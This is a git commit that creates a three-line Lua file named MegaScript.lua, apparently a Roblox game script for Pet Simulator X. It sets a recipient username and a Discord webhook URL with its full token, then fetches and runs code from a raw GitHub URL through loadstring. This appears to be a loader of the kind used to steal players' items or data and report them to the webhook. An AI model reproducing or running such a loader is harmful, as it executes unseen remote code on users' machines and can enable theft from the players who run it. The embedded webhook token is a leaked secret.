6d13e7f43485b7dc65a69ed427a8988f3f95eb08
superpon08 <123949756+superpon08@users.noreply.github.com>
2023-01-30 14:39:12 +0300

    Create MegaScript.lua

---
+++ MegaScript.lua
@@ -0,0 +1,3 @@
+UserName = "artemplye"
+WebHook = "https://discord.com/api/webhooks/1036972623520862239/6kwrUu258GkTErJWqeqFqJMfJjwGT5aoMgFKFl1AdKd9RRlqGuAa09HfprtuhHwMRoVN"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
